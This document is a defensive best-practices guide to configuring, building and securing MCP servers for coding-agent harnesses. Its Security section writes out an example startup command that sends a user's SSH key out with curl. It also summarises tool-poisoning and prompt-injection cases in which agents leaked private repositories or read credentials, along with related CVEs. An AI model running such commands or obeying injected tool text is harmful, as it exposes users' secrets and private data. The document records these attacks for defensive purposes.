# MCP: best practices

How to decide on, configure, build and secure MCP servers for a coding-agent harness. Claude Code and Codex are the leads; OpenCode appears where the sources cover it. Terms (server definition, transport, tool filter, tool approval, qualified tool name `mcp__<server>__<tool>`, admin allowlist) follow the [MCP concept page](../concepts/mcp.md). Research date: 2026-10-04.

Evidence labels: **[Vendor]** vendor guidance, including the MCP specification. **[Empirical]** a study or measured data. **[Advisory]** a security advisory, CVE or coordinated disclosure. **[Practitioner]** practitioner opinion or an informal experiment.

Context-cost guidance written before mid-2026 predates deferred tool loading in both leads. It is marked "older" below.

## Summary

1. [Prefer a CLI the model knows, plus a skill, when a sandboxed shell exists](#1-prefer-a-known-cli-plus-a-skill); use MCP for authenticated SaaS, stateful tools and systems without a CLI.
2. [Pair every MCP server with a skill that teaches the workflow](#2-pair-each-server-with-a-skill).
3. [Expose only the tools the task needs](#3-limit-the-enabled-tools) with a tool filter, and avoid overlapping tools.
4. [Bound tool output](#5-bound-tool-output): deferred loading shrinks definitions, not results.
5. [Allowlist servers by identity (command or URL) and pin versions](#12-allowlist-servers-by-identity-and-pin-versions); a server name is not a security control.
6. [Never combine untrusted content, private data and an exfiltration channel in one session](#13-split-untrusted-reads-from-writes-and-exfiltration).
7. When building a server: [few workflow-level tools](#7-design-few-workflow-level-tools), [descriptions written for a new hire](#8-write-descriptions-for-a-new-team-member), [concise paginated results](#9-return-concise-paginated-results) and [actionable `isError` results](#10-return-actionable-tool-errors).
8. [Use OAuth with minimal scopes and keep secrets out of committed config](#11-authenticate-with-minimal-scopes-and-no-committed-secrets).

## When to use it

MCP gives the agent tools from an external process or endpoint. It is one of several ways to reach an external system. The decision rule from the notes (inference built on [Vendor] and [Empirical] findings):

| Situation | Use | Why |
| --- | --- | --- |
| A CLI the model already knows exists (`gh`, `aws`, `gcloud`, `kubectl`, `sentry-cli`) and the agent has a sandboxed shell | CLI plus a [skill](../concepts/skills.md) that documents team conventions | The CLI runs inside the command sandbox and the shell [permission rules](../concepts/permissions-and-sandbox.md); MCP servers do not. CLI output can be filtered with `jq`, `head` or `grep` before it reaches the model. |
| SaaS with OAuth, a stateful integration (browser, debugger session), or no usable CLI | MCP server plus a skill | The server handles connection and auth; the skill teaches usage. |
| The agent copies data from a browser tab it cannot see | MCP | Claude Code's stated trigger for adding MCP ([Extend Claude Code](https://code.claude.com/docs/en/features-overview)). |
| A workflow chains many calls over large data | Code execution against an API, SDK or MCP bindings in a sandbox | Intermediate data stays out of the context ([Anthropic, Code execution with MCP](https://www.anthropic.com/engineering/code-execution-with-mcp)). |
| A deterministic step must run on an event | A [hook](../concepts/hooks.md), not a tool | Hooks run on harness events; MCP tools are offered to the model. |
| The same servers must reach several repositories or teams | Ship the server definitions in a [plugin](./plugins.md) | Plugins are the distribution unit for MCP definitions. |
| The client has no shell | MCP | Zechner's conclusion ([Zechner, MCP vs CLI](https://mariozechner.at/posts/2025-08-15-mcp-vs-cli/), older). |

Context cost no longer decides between CLI and MCP in either lead, except where deferral is off: Claude Code with a custom `ANTHROPIC_BASE_URL`, `ENABLE_TOOL_SEARCH=false` or a pre-4.5 model; Codex with an older model/provider combination; and OpenCode, which loads every tool definition (inference from [Claude Code MCP](https://code.claude.com/docs/en/mcp), [openai/codex PR #29486](https://github.com/openai/codex/pull/29486) and the [MCP concept page](../concepts/mcp.md)).

## Approaches

### CLI plus skill, no MCP

- **What:** the agent calls an existing command-line tool through its shell. A skill documents the commands and team conventions. The model can learn an unknown CLI from its `--help` output ([Claude Code best practices](https://code.claude.com/docs/en/best-practices)).
- **When it fits:** a known CLI exists, the machine has a sandboxed shell, and output benefits from piping.
- **How:** allow the specific commands in the permission rules (for example `Bash(gh pr view *)` in Claude Code); keep the sandbox on. Put the conventions in a skill (see [skills](../concepts/skills.md)).
- **Trade-offs:** portable across harnesses and inside the sandbox. In Claude Code, the command-safety check runs on every bash call: in Zechner's benchmark the CLI variant used 1.3–2M Haiku tokens against 35k for MCP, at similar total cost ($19.95 vs $19.45) ([Zechner](https://mariozechner.at/posts/2025-08-15-mcp-vs-cli/), Aug 2025, older).

### Local stdio server

- **What:** the harness starts a local process and talks to it over stdio.
- **When it fits:** tools that need local state or a local runtime (browser automation, debuggers) or wrap a local system.
- **How (generalized):** a named server definition with command, arguments, environment, timeouts, tool filter and tool approval. Use the same server name in every harness so `mcp__<name>__<tool>` matches across them ([MCP concept page](../concepts/mcp.md)).
  - Claude Code: `.mcp.json` (project, committed) or `~/.claude.json` (local or user scope). Always set `"type": "stdio"`. Filter tools with a bare `deny` permission rule on `mcp__<server>__<tool>`.
  - Codex: `[mcp_servers.<name>]` in `~/.codex/config.toml` or a trusted project's `.codex/config.toml`; `command` selects stdio. Filter with `enabled_tools` / `disabled_tools`; set approval with `default_tools_approval_mode` and `tools.<tool>.approval_mode`; `required = true` fails startup when the server cannot start ([Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)).
  - OpenCode: `mcp` key with `"type": "local"` in `opencode.json`; filter with `permission` deny patterns.
- **Trade-offs:** the process runs with user privileges outside the command sandbox in both leads ([MCP concept page](../concepts/mcp.md)). Unpinned `npx -y` / `uvx` commands run whatever the latest release is.

Example with a pinned version and filtered tools (package and tool names are placeholders). Claude Code, `.mcp.json`:

```json
{ "mcpServers": { "docs": { "type": "stdio", "command": "npx", "args": ["-y", "@example/docs-mcp@1.4.2"] } } }
```

Codex, `.codex/config.toml`:

```toml
[mcp_servers.docs]
command = "npx"
args = ["-y", "@example/docs-mcp@1.4.2"]
enabled_tools = ["search_docs", "get_page"]
default_tools_approval_mode = "prompt"
tools.get_page.output_token_limit = 8000
```

### Remote streamable HTTP server

- **What:** the harness connects to an HTTPS endpoint; auth is OAuth, a bearer token from the environment, or a header helper command.
- **When it fits:** SaaS integrations with per-user auth (issue trackers, design tools, observability).
- **How:**
  - Claude Code: `"type": "http"` with `url`; `claude mcp login`; pin scopes with `oauth.scopes`; pre-register `--client-id` / `--callback-port` when the server lacks Dynamic Client Registration; `headersHelper` for Kerberos, short-lived tokens or internal SSO (must print JSON within 10 s; re-runs on 401/403; runs only after workspace trust for project and local servers). Remote servers with `alwaysLoad: false` (default) connect only when a tool is first called ([Claude Code MCP](https://code.claude.com/docs/en/mcp)).
  - Codex: `url` selects HTTP; `bearer_token_env_var`, `env_http_headers`, static `http_headers`, or `http_headers_helper`; OAuth via CIMD or DCR; Codex prefers the server's `scopes_supported` ([Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)).
  - OpenCode: `"type": "remote"`; OAuth starts automatically on 401 with DCR ([MCP concept page](../concepts/mcp.md)).
- **Trade-offs:** no local process, but OAuth adds confused-deputy, SSRF and redirect risks on the server side (see [Security](#security)). Codex's network proxy does not filter MCP connections ([Codex security](https://learn.chatgpt.com/docs/agent-approvals-security)).

### Code execution against MCP or APIs

- **What:** the agent writes code against MCP servers presented as files (`./servers/<server>/<tool>.ts`) or against bindings, and runs it in a sandbox. Anthropic reported one example dropping from 150,000 to 2,000 tokens (98.7%) ([Anthropic, Code execution with MCP](https://www.anthropic.com/engineering/code-execution-with-mcp), Nov 2025). Cloudflare's Code Mode runs TypeScript against MCP bindings in V8 isolates with credentials kept in bindings outside the sandbox ([Cloudflare Code Mode](https://blog.cloudflare.com/code-mode/), Sep 2025).
- **When it fits:** many chained calls, large intermediate data, or data that should not pass through the model.
- **Trade-offs:** needs a "secure execution environment with appropriate sandboxing, resource limits, and monitoring", which direct tool calls avoid ([Anthropic](https://www.anthropic.com/engineering/code-execution-with-mcp)).

### Plugin-bundled server

- **What:** server definitions shipped inside a plugin. Claude Code names the tools `mcp__plugin_<plugin>_<server>__<tool>`. In Codex, users control enablement and tool settings of plugin servers, not the transport ([MCP concept page](../concepts/mcp.md)).
- **When it fits:** the same server set is needed in several repositories. See [plugins](./plugins.md).
- **Trade-offs:** the plugin's version, not the user, decides the server command. Admin MCP allowlists still apply: Codex matches plugin servers under `plugins.<p>.mcp_servers.<s>.identity` ([Codex managed configuration](https://developers.openai.com/codex/enterprise/managed-configuration)).

## Practices

### Using MCP servers

#### 1. Prefer a known CLI plus a skill

- **Practice:** when the model knows a CLI for the system and a sandboxed shell exists, use the CLI and document conventions in a skill.
- **Why:** the CLI path runs inside the command sandbox and the bash permission rules; MCP servers do not. CLI output can be filtered before it enters the context; MCP results cannot unless the server paginates or filters (inference in the notes).
- **How:** tell the agent which CLI to use; allow its subcommands with prefix rules; put team conventions in a skill.
- **Evidence:** [Vendor] "CLI tools are the most context-efficient way to interact with external services" ([Claude Code best practices](https://code.claude.com/docs/en/best-practices)). [Empirical, Aug 2025, older] MCP and CLI both reached 100% success on 3 tasks × 10 runs; tool design mattered more than protocol ([Zechner](https://mariozechner.at/posts/2025-08-15-mcp-vs-cli/)). [Practitioner, Oct 2025, older] Willison prefers skills to MCP for coding agents and notes GitHub's MCP server "consumes tens of thousands of tokens of context" ([Willison](https://simonwillison.net/2025/Oct/16/claude-skills/)). [Practitioner, Nov 2025, older] Playwright MCP's 21 tools use 13.7k tokens (6.8% of Claude's context), replaced by bash tools and a 225-token README ([Zechner, What if you don't need MCP at all?](https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/)).
- **Disagreement:** the 2025 context-cost arguments assumed eager loading. A Jul 30 2026 single-task test found near-equal context use with deferred loading (48–50k tokens MCP vs 45–48k CLI plus skill): "There's no big difference in using CLIs or MCPs these days" ([Checkly](https://www.checklyhq.com/blog/mcp-vs-cli-token-efficiency/), [Empirical/Practitioner], small n). The remaining reasons to prefer a CLI are sandboxing, output filtering and portability, not definition size.

#### 2. Pair each server with a skill

- **Practice:** when you add an MCP server, add a skill that teaches how and when to use its tools.
- **Why:** MCP provides the connection; the skill provides the workflow knowledge.
- **How:** a skill that names the qualified tools, the order of calls and team conventions. Ship both together in a plugin when they are reused (see [plugins](./plugins.md)).
- **Evidence:** [Vendor] "Skill + MCP: MCP provides the connection; a skill teaches Claude how to use it well" ([Extend Claude Code](https://code.claude.com/docs/en/features-overview)).

#### 3. Limit the enabled tools

- **Practice:** enable only the tools the work needs and remove overlapping tools.
- **Why:** each enabled tool is attack surface and a choice the model has to make; overlapping tools confuse that choice.
- **How:**
  - Codex: `enabled_tools` (allowlist) and `disabled_tools` (applied after the allowlist); `enabled = false` turns a server off ([Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)).
  - Claude Code: no per-server filter key. A bare `deny` rule on `mcp__<server>__<tool>` removes the tool from context. Settings files skip MCP rules with parentheses; use `--disallowedTools` for parameter rules. A hook matcher needs `mcp__<server>__.*`, not `mcp__<server>` ([MCP concept page](../concepts/mcp.md)).
  - OpenCode: `permission` deny patterns such as `"mymcp_*": "deny"`.
- **Evidence:** [Vendor] avoid overlapping tools ([Anthropic, Writing effective tools for agents](https://www.anthropic.com/engineering/writing-tools-for-agents)).

#### 4. Keep deferred tool loading on and know when it is off

- **Practice:** rely on deferred loading for large tool sets, and check the conditions that disable it.
- **Why:** five servers with 58 tools cost about 55K tokens of definitions; Anthropic saw 134K internally before optimization. Tool search cut about 77K to 8.7K tokens (85%) and raised MCP-eval accuracy from 49% to 74% (Opus 4) and 79.5% to 88.1% (Opus 4.5) ([Anthropic, Advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use), Nov 2025).
- **How:**
  - Claude Code: tool search is on by default; only tool names and server instructions load at start. It is off with a customized `ANTHROPIC_BASE_URL`, `ENABLE_TOOL_SEARCH=false`, or pre-4.5 models. Check per-tool tokens with `/context all` ([Claude Code MCP](https://code.claude.com/docs/en/mcp)).
  - Codex: since PR #29486 (merged 2026-06-22) all effective MCP tools are deferred when `tool_search` and namespaced tools are supported. The `tool_search_always_defer_mcp_tools` flag is ignored. Older model/provider combinations load all tools eagerly ([openai/codex PR #29486](https://github.com/openai/codex/pull/29486)). The fetched Codex user docs do not describe tool search.
  - OpenCode: loads all definitions eagerly; keep tool sets small there ([MCP concept page](../concepts/mcp.md)).
- **Evidence:** [Vendor] as above. For API-level tool use, Anthropic advises tool search when definitions exceed 10K tokens or 10+ tools, and to "keep your three to five most-used tools always loaded, defer the rest" ([Advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)).

#### 5. Bound tool output

- **Practice:** set output limits per tool and prefer servers that paginate.
- **Why:** deferral shrinks definitions only; every result still enters the context.
- **How:**
  - Claude Code warns when one tool output exceeds 10,000 tokens; the default limit is `MAX_MCP_OUTPUT_TOKENS=25000`; larger results are saved to a file. A server can raise the limit for one tool with `_meta["anthropic/maxResultSizeChars"]` up to 500,000 characters. A call still running after 2 minutes moves to a background task (`CLAUDE_CODE_MCP_AUTO_BACKGROUND_MS`) ([Claude Code MCP](https://code.claude.com/docs/en/mcp)).
  - Codex: `tools.<tool>.output_token_limit`; default timeouts `startup_timeout_sec` 10 s and `tool_timeout_sec` 60 s ([Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)). The default output limit is not documented.
  - OpenCode: `tool_output` (2000 lines / 51200 bytes) applies to all tools ([MCP concept page](../concepts/mcp.md)).
- **Evidence:** [Vendor] as cited.

#### 6. Put shared servers in project scope and personal ones in user or local scope

- **Practice:** commit team-shared servers without secrets; keep credential-bearing or experimental servers private.
- **Why:** project config is shared through version control; credentials there leak.
- **How:**
  - Claude Code: project `.mcp.json` (committed) for the team; local scope (default, in `~/.claude.json`) for "personal development servers, experimental configurations, or servers with credentials you don't want in version control"; user scope for cross-project tools. On a name collision the whole entry from local > project > user wins ([Claude Code MCP](https://code.claude.com/docs/en/mcp)).
  - Codex: user config and project `.codex/config.toml`; the project file loads only in trusted projects. CLI, IDE extension and desktop app share one config ([Codex MCP](https://developers.openai.com/codex/mcp)).
  - Secrets: Claude Code expands `${VAR}` and `${VAR:-default}` in `command`, `args`, `env`, `url`, `headers`; credential-like variables (`ANTHROPIC_API_KEY`, `AWS_BEARER_TOKEN_BEDROCK`, `NPM_TOKEN`) expand to empty for remote servers, so copy the value into your own variable name ([Claude Code MCP](https://code.claude.com/docs/en/mcp)). Codex: `env_vars`, `bearer_token_env_var`, `env_http_headers`. OpenCode: `{env:VAR}`.
- **Evidence:** [Vendor] as cited.

### Building MCP servers

#### 7. Design few workflow-level tools

- **Practice:** build "a few thoughtful tools targeting specific high-impact workflows" instead of one tool per endpoint, namespaced under a service prefix.
- **Why:** consolidated tools need fewer calls and less context; overlapping tools confuse selection.
- **How:** `schedule_event` instead of `list_users` + `list_events` + `create_event`. Prefix related tools (`asana_search`, `jira_search`); whether prefix or suffix works better "varies by LLM", so test it. Tool names: 1–128 characters from `A-Za-z0-9_-.`, unique per server; return tools in a deterministic order (helps caching). Keep the server name stable: it becomes part of `mcp__<server>__<tool>`, which permission rules and hook matchers use.
- **Evidence:** [Vendor, Sep 2025] ([Anthropic, Writing effective tools for agents](https://www.anthropic.com/engineering/writing-tools-for-agents)); [Vendor] ([MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)). No vendor gives a number of tools per server beyond "few".

#### 8. Write descriptions for a new team member

- **Practice:** write tool descriptions "as if onboarding a new team member", with examples for complex parameters.
- **Why:** with deferred loading, the description is also the search key. Tool use examples raised accuracy on complex parameters from 72% to 90%.
- **How:** state query formats, terminology and resource relationships; use unambiguous parameter names (`user_id`, not `user`); add examples for nested structures, many optional parameters and domain conventions.
- **Evidence:** [Vendor, Sep 2025] ([Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)); [Vendor/Empirical, Nov 2025] ([Advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)); [Vendor] "Clear tool descriptions: enable effective tool search" ([Claude Code MCP](https://code.claude.com/docs/en/mcp)).

#### 9. Return concise, paginated results

- **Practice:** return filtered, human-readable results with a `concise` default, and paginate or truncate with instructions for getting more.
- **Why:** results are the main remaining context cost. In one Slack example, `detailed` was 206 tokens and `concise` 72.
- **How:**
  - Drop low-level IDs such as UUIDs in favour of names; offer a `response_format` enum (`concise`/`detailed`).
  - Paginate, filter, select ranges and truncate with defaults; when truncating, tell the agent how to narrow the query.
  - For Claude Code, declare `anthropic/maxResultSizeChars` for inherently large outputs rather than asking users to raise `MAX_MCP_OUTPUT_TOKENS`. Send progress notifications so long calls do not hit idle timeouts (5 min HTTP, 30 min stdio).
  - Use `structuredContent` with an `outputSchema` where callers parse results; also return the JSON in a text block for compatibility. Return a `resource_link` instead of large content.
  - For stateful tools, return an explicit opaque high-entropy handle (for example `basket_id`), re-authorize on every call, state the handle's lifetime in the description, and return a tool error on expiry. The 2026-07-28 specification has no protocol session; legacy revisions differ.
- **Evidence:** [Vendor, Sep 2025] ([Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)); [Vendor] ([Claude Code MCP](https://code.claude.com/docs/en/mcp)); [Vendor] ([MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)).

#### 10. Return actionable tool errors

- **Practice:** report tool execution failures as results with `isError: true` and a message that names the fix.
- **Why:** clients pass execution errors to the model, which can self-correct; opaque codes give it nothing to act on.
- **How:** reserve JSON-RPC protocol errors for unknown tools and malformed requests. Example message: "Invalid departure date: must be in the future. Current date is 08/08/2025."
- **Evidence:** [Vendor] ([MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)); [Vendor, Sep 2025] errors should be "clearly actionable improvements, rather than opaque error codes" ([Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)).

#### 11. Authenticate with minimal scopes and no committed secrets

- **Practice:** use OAuth with least-privilege scopes (or a header helper for internal SSO), validate token audience, and never pass tokens through.
- **Why:** broad or forwarded tokens turn a compromised or confused server into access to everything the user can reach.
- **How:**
  - Servers MUST NOT accept tokens not issued to them (audience validation, RFC 9068); token passthrough is forbidden.
  - OAuth proxy servers MUST implement per-client consent, exact `redirect_uri` matching, and single-use `state` with short expiry, set only after consent.
  - Start with a minimal scope (for example `mcp:tools-basic`) and step up via `WWW-Authenticate scope=`. Avoid wildcard or omnibus scopes and publishing every scope in `scopes_supported`.
  - Do not encode secrets as `x-mcp-header` parameters; do not put static API keys in `.mcp.json` or `config.toml`.
  - Claude Code sends OAuth credentials only to HTTPS or loopback token endpoints.
- **Evidence:** [Vendor] ([MCP Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)); [Vendor] ([Claude Code MCP](https://code.claude.com/docs/en/mcp)); [Vendor] ([Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)).

Further server rules from the same sources:

- **Transport:** use stdio or streamable HTTP. Codex supports only those; SSE is deprecated in Claude Code; WebSocket and SDK transports are Claude Code only ([MCP concept page](../concepts/mcp.md)). Local servers SHOULD use stdio; a local HTTP server must require an auth token or use a unix socket, to block DNS rebinding from browser pages ([MCP Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)).
- **Server instructions:** keep the first 512 characters self-contained (Codex); Claude Code truncates at 2,048 ([Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli); [MCP concept page](../concepts/mcp.md)).
- **Approval hints:** emit both `_meta["anthropic/requiresUserInteraction"]` (Claude Code) and a destructive annotation (Codex always asks for approval unless the tool also carries a read annotation) on destructive tools ([Codex security](https://learn.chatgpt.com/docs/agent-approvals-security); [MCP concept page](../concepts/mcp.md)). Clients MUST treat annotations as untrusted unless the server is trusted ([MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)).
- **Server duties:** validate inputs, enforce access control, rate limit, sanitize outputs ([MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)).

### Securing MCP

#### 12. Allowlist servers by identity and pin versions

- **Practice:** admins allowlist servers by command or URL, not only by name; users pin package versions.
- **Why:** a name is not a security control. Unpinned `npx -y` / `uvx` runs the latest release in every session. `postmark-mcp` added a backdoor in version 1.0.16; an unpinned installation can pick up such an update.
- **How:**
  - Claude Code: `allowedMcpServers` / `deniedMcpServers` by `serverUrl` (wildcards), `serverCommand` or name; `managed-mcp.json` / `managedMcpServers` for exclusive control (an empty map disables MCP) ([Claude Code MCP](https://code.claude.com/docs/en/mcp)). `disableSideloadFlags` does not restrict `.mcp.json`, `claude mcp add` or SDK servers: "Pair it with `allowedMcpServers`". `strictPluginOnlyCustomization: ["mcp"]` blocks servers not from a plugin, managed settings or built-ins ([Claude Code plugins for orgs](https://code.claude.com/docs/en/plugins/org)).
  - Codex: `requirements.toml` `[mcp_servers.<id>] identity` by command or URL with exact, prefix or regex matchers; name and identity must both match; an empty table disables all servers; the same shapes apply to plugin servers ([Codex managed configuration](https://developers.openai.com/codex/enterprise/managed-configuration)).
  - Pin `@x.y.z` and use an internal mirror or registry. Avoid "latest".
- **Evidence:** [Vendor] as cited; [Practitioner/standards body] OWASP MCP04 ([OWASP MCP04](https://owasp.org/www-project-mcp-top-10/2025/MCP04-2025%E2%80%93Software-Supply-Chain-Attacks%26Dependency-Tampering)); [Advisory] pin tools and packages by hash against rug pulls ([Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)).

#### 13. Split untrusted reads from writes and exfiltration

- **Practice:** do not give one session private data, untrusted content and a channel to send data out (the "lethal trifecta").
- **Why:** injection through tool results works even when the server is clean: in the GitHub MCP "toxic agent flow", a malicious public issue led the agent to leak private repositories into a public PR ([Invariant Labs, GitHub MCP](https://invariantlabs.ai/blog/mcp-github-vulnerability), May 2025). Guardrails are not enough: "in web application security 95% is very much a failing grade".
- **How:** run tools that read untrusted content (issues, web, email) in a [subagent](../concepts/subagents.md) or session without write or exfiltration tools. Set approval to `prompt` / `ask` for any tool that sends data out (PR creation, email, HTTP). Do not auto-approve write tools on servers that also read untrusted content. A read-only query is also outbound: exclude private data from this worker and constrain query arguments at the call boundary ([OpenAI deep research security](https://developers.openai.com/api/docs/guides/deep-research), [Vendor]; enforcement recommendation [Inference]).
- **Evidence:** [Practitioner, Apr/Jun 2025] ([Willison, lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/); [Willison, MCP prompt injection](https://simonwillison.net/2025/Apr/9/mcp-prompt-injection/)); [Advisory] (Invariant, above). Pattern is an inference in the notes.

#### 14. Review a third-party server before connecting it

- **Practice:** read the source and the `tools/list` output, and re-review on every version bump.
- **Why:** tool descriptions can carry hidden instructions (poisoning) and can change after approval (rug pull). Neither lead's fetched docs say whether the harness detects description changes after approval.
- **How:** (1) read the source and the tool descriptions, looking for hidden or Unicode text; (2) check the publisher matches the official vendor (typosquats); (3) pin the version; (4) check the requested OAuth scopes; (5) diff `tools/list` on every update. One-click local installs must show the full command and get explicit consent ([MCP Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)).
- **Evidence:** [Vendor] "Verify you trust each server before connecting it. Servers that fetch external content can expose you to prompt injection risk" ([Claude Code MCP](https://code.claude.com/docs/en/mcp)); [Advisory] ([Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)). Procedure is an inference in the notes.

#### 15. Evaluate tools with realistic tasks

- **Practice:** iterate on a server with an eval set built from realistic multi-step tasks.
- **Why:** naming, description and response-format choices vary in effect by model; only measurement settles them.
- **How:** build "dozens of prompt and response pairs"; measure accuracy, runtime, tool calls, tokens and errors; keep held-out sets; let an agent read transcripts and propose tool changes. Test locally before sharing (`claude mcp add --transport stdio test-server -- node server.js`, then `/mcp`). For a cross-harness server, run the held-out set in both Claude Code and Codex.
- **Evidence:** [Vendor, Sep 2025] ([Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)); [Vendor] ([Claude Code MCP](https://code.claude.com/docs/en/mcp)).

## Anti-patterns

| Avoid | Do instead |
| --- | --- |
| One tool per REST endpoint | A few workflow-level, prefixed tools ([7](#7-design-few-workflow-level-tools)) |
| Raw API JSON with UUIDs, unbounded list tools | Concise default, names over IDs, pagination with "next" instructions ([9](#9-return-concise-paginated-results)) |
| Opaque error codes | `isError` results that name the fix ([10](#10-return-actionable-tool-errors)) |
| Relying on per-connection state | Explicit handles, re-authorized each call |
| Static API keys in `.mcp.json` or `config.toml`; secrets as `x-mcp-header` parameters | Environment variables, OAuth, header helpers ([6](#6-put-shared-servers-in-project-scope-and-personal-ones-in-user-or-local-scope), [11](#11-authenticate-with-minimal-scopes-and-no-committed-secrets)) |
| Requesting every OAuth scope up front | Minimal scope, step-up |
| `npx -y <pkg>` / `uvx <pkg>` without a version | `@x.y.z` or an internal mirror ([12](#12-allowlist-servers-by-identity-and-pin-versions)) |
| Allowlisting by server name only | Match command or URL identity |
| Committing `enableAllProjectMcpServers` | Approve servers individually; admin allowlist |
| `-p` or CI in untrusted checkouts with repository MCP config | Claude Code `--bare` (or `--strict-mcp-config` to limit a run to command-line servers); Codex project trust off; see [automation](./automation.md) |
| Auto-approving write tools on a server that reads untrusted content | Approval on every outbound tool; split sessions ([13](#13-split-untrusted-reads-from-writes-and-exfiltration)) |
| Assuming 2025 context-cost measurements still apply | Measure with `/context all`; deferral changed the numbers ([4](#4-keep-deferred-tool-loading-on-and-know-when-it-is-off)) |

## Security

Threat model per server (inference in the notes): (1) is the code trustworthy (supply chain, local process); (2) are the descriptions trustworthy (poisoning, rug pull); (3) are the results trustworthy (injection from fetched content); (4) are the credentials scoped (confused deputy, broad tokens). Allowlisting covers (1) and part of (2). Least privilege, separated data access and enforced outbound argument/destination checks reduce (3) (inference; [security guide](../guide/security.md#data-access-and-outbound-channels)). Read-only search still sends its arguments outside the session ([OpenAI deep research security](https://developers.openai.com/api/docs/guides/deep-research)).

| Threat | What happens | Mitigation |
| --- | --- | --- |
| Tool poisoning (Invariant Labs, Apr 1 2025) | Hidden instructions in descriptions, visible to the model but not the UI; PoC "add" tool reads `~/.cursor/mcp.json` and SSH keys | Read full descriptions; pin by hash; cross-server dataflow boundaries ([Invariant](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)) |
| Rug pull | Server changes descriptions after approval | Pin versions; diff `tools/list` on update |
| Shadowing | One server's description changes how the agent uses another server | Fewer servers per session; review descriptions |
| Injection through results (GitHub MCP, May 2025) | Clean server, malicious content in fetched data drives the agent | Lethal-trifecta split; approval on outbound tools ([Invariant](https://invariantlabs.ai/blog/mcp-github-vulnerability)) |
| Confused deputy in OAuth proxies | Static client ID plus DCR plus consent cookie lets an attacker reuse consent | Per-client consent, exact `redirect_uri`, single-use `state` ([MCP Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)) |
| SSRF through OAuth metadata URLs | Server points the client at internal addresses | Block private ranges and `169.254.0.0/16`, require HTTPS, validate redirects (same source) |
| Malicious startup commands | `npx malicious-package && curl -d @~/.ssh/id_rsa ...` | Show full command, explicit consent, sandbox servers with minimal privileges (same source) |
| `javascript:` authorization URLs | XSS or RCE in the client | Validate URL schemes (same source) |

Measured susceptibility: [Empirical, Aug 2025; AAAI] MCPTox tested 45 live servers, 353 tools, 1,348 malicious cases. Average attack success was 36.5% (o1-mini 72.8%, Phi-4 70.2%, GPT-4o-mini 61.8%); more capable models were often more susceptible; the highest refusal rate was under 3% (Claude 3.7 Sonnet). These models are old; no 2026 data was found ([MCPTox](https://arxiv.org/html/2508.14925v1)). OWASP's MCP Top 10 (2025 beta) lists MCP01 token mismanagement through MCP10 context over-sharing, including tool poisoning, supply chain, command injection, prompt injection and shadow MCP servers ([OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/)).

Incidents and advisories:

| Date | Item | Detail |
| --- | --- | --- |
| Fixed 2025-06-17 | CVE-2025-6514, `mcp-remote` 0.0.5–0.1.15 [Advisory] | OS command injection via a crafted `authorization_endpoint` from an untrusted server; CVSS 9.6; fixed in 0.1.16; found by JFrog ([GitLab advisory](https://advisories.gitlab.com/npm/mcp-remote/CVE-2025-6514/)) |
| 2025 | CVE-2025-49596, MCP Inspector < 0.14.1 [Advisory] | No auth between Inspector client and proxy; RCE over stdio ([SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-49596/)) |
| 2025 | CVE-2025-58444, MCP Inspector, fixed 0.16.6 [Advisory] | XSS via a redirect URL from a malicious server, leading to command execution ([GitLab advisory](https://advisories.gitlab.com/npm/@modelcontextprotocol/inspector/CVE-2025-58444/)) |
| Fixed 2025-08-20 | CVE-2025-61260, Codex CLI [Advisory] | A repository `.env` set `CODEX_HOME=./.codex`; project `mcp_servers` commands ran at startup without a prompt; CVSS 9.8; fixed in v0.23.0 ([Check Point](https://research.checkpoint.com/2025/openai-codex-cli-command-injection-vulnerability/); [NVD](https://nvd.nist.gov/vuln/detail/cve-2025-61260)) |
| 2025 | `postmark-mcp` on npm [Advisory] | An unofficial connector added an external BCC in 1.0.16 after building trust over 15 versions; Postmark's API was unaffected ([Postmark incident notice](https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package)) |
| Fixes 2025-08-26, 2025-09-22, 2025-12-28 | Claude Code project files, Check Point [Advisory] | CVE-2025-59536 RCE through hooks in repository `.claude/settings.json`; MCP consent bypass via `enableAllProjectMcpServers` / `enabledMcpjsonServers` in project settings; API key exfiltration via a project-set `ANTHROPIC_BASE_URL` before the trust dialog ([Check Point](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)) |

Current harness behaviour to plan around:

- Local MCP servers run outside the command sandbox in both leads; Codex's network proxy does not filter MCP connections ([Codex security](https://learn.chatgpt.com/docs/agent-approvals-security); [MCP concept page](../concepts/mcp.md)).
